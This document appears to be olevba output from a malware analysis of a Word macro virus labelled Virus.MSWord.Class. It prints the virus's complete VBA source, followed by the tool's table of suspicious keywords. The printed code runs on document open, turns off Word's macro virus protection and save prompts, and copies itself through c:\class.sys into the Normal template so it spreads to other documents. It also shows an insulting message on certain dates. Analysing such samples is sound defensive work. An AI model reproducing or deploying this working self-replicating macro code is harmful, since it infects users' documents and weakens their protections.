olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-1284b8eb4daae2fc98739773cca77cbc55e6e487
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-1284b8eb4daae2fc98739773cca77cbc55e6e487 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
On Error GoTo out
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
Options.VirusProtection = False
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
Options.SaveNormalPrompt = False
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
Options.ConfirmConversions = False
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
If nt > 70 And ad > 0 Then GoTo out
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
If nt < 70 Then
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
End If
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
host.codemodule.AddFromFile ("c:\class.sys")
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
With host.codemodule
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    For x = 1 To 4
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    .deletelines 1
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    Next x
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
End With
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
If nt < 70 Then
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    With host.codemodule
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    .replaceline 1, "Sub AutoClose()"
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    .replaceline 71, "Sub ToolsMacro()"
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    End With
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
End If
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
With host.codemodule
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    For x = 2 To 72 Step 2
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
    Next x
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
End With
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
out:
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
End Sub
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
Sub ViewVBCode()
'mumu29.10.2002 10:47:52HP DeskJet 610C Series on LPT1:1Clippit
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
